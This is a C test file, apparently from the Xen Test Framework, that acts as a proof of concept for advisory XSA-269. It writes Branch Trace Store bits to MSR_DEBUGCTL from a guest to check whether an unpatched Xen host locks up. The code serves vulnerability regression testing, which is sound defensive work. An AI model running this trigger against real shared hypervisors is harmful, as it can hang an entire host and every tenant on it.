/**
 * @file tests/xsa-269/main.c
 * @ref test-xsa-269
 *
 * @page test-xsa-269 XSA-269
 *
 * Advisory: [XSA-269](https://xenbits.xen.org/xsa/advisory-269.html)
 *
 * Before XSA-269, no reserved bit checking was performed for writes to
 * MSR_DEBUGCTL.  Branch Trace Store isn't virtualised, and must only be
 * accessable to fully trusted guests, as a misconfiguration locks up the
 * entire host.
 *
 * After XSA-169, vPMU was removed from security support, so the CPUID bit are
 * expected to be hidden, even when the XSA-269 vulnerability is present.
 *
 * This test tries to blindly turn on BTS.  If Xen doesn't hang, is isn't
 * vulnerable to XSA-269.
 *
 * @see tests/xsa-269/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-269 PoC";

void test_main(void)
{
    unsigned int i;
    uint64_t val = 0;

    /*
     * If Debug Store is advertised, presume that vPMU is properly configured
     * for this domain, and that we're trusted not to (mis)use it.
     */
    if ( cpu_has_ds )
        return xtf_skip("Skip: Debug Store is available\n");

    /*
     * We cannot rely on CPUID bits, as vPMU is disabled by default.  Turn on
     * each part of BTS individually to reduce the chance of the host hang
     * being mitigated by a vmentry failure.  If vulnerable, we'd expect a
     * host lockup on the vmentry following the setting of BTS.
     */
    wrmsr_safe(MSR_DEBUGCTL, val |= DEBUGCTL_TR);
    wrmsr_safe(MSR_DEBUGCTL, val |= DEBUGCTL_BTS);
    wrmsr_safe(MSR_DEBUGCTL, val |= DEBUGCTL_BTINT);

    /*
     * If we're still alive, generate a billion jumps to check that BTS really
     * is disabled.
     */
    for ( i = 0; i < GB(1); ++i )
        barrier();

    /* If we're still alive at this point, Xen is definitely not vulnerable. */

    xtf_success("Success: Not vulnerable to XSA-269\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
